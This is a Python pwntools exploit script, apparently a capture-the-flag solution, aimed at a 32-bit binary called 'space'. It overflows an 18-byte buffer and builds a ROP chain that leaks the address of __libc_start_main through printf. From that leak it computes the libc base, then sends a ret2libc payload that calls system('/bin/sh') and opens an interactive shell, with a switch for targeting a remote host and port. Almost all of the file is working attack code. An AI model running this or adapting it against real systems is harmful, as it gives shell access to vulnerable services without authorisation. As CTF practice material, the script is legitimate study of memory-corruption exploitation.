#!/bin/python3
from pwn import *
import sys

host = sys.argv[1]
port = sys.argv[2]

context.binary = './space'
context.aslr = False


#sh = remote(host,port)
sh = process("./space")

space = ELF('./space')
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")

puts_plt = space.plt['printf']
libc_start_main_got = space.got['__libc_start_main']
main = space.symbols['main']

log.info("Leak libc_start_main_got addr")

payload = flat(['A' * 18, puts_plt, main, libc_start_main_got])
print(payload)
sh.sendlineafter('> ', payload)

print("receiving libc_start_main_addr")

libc_start_main_addr = u32(sh.recv(4))
log.info("libc_start_main address : "+ hex(libc_start_main_addr))

# calc remote libc_start_main addr
libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']

# find offsets of system, exit, '/bin/sh'
system = libc.sym["system"]
exit = libc.sym["exit"]
binsh = next(libc.search(b"/bin/sh"))

# Calculate offsets
system_addr = libcbase + system
exit_addr = libcbase + exit
binsh_addr = libcbase + binsh
padding = 'A' * 18
log.info("/bin/sh %s " % hex(libcbase + binsh))
log.info("system %s " % hex(libcbase + system))
log.info("exit %s " % hex(libcbase + exit))


payload = flat([padding, system_addr, exit_addr, binsh_addr])

with open("2payload", "w") as f:
    f.write(str(payload))

sh.sendline(payload)

sh.interactive()
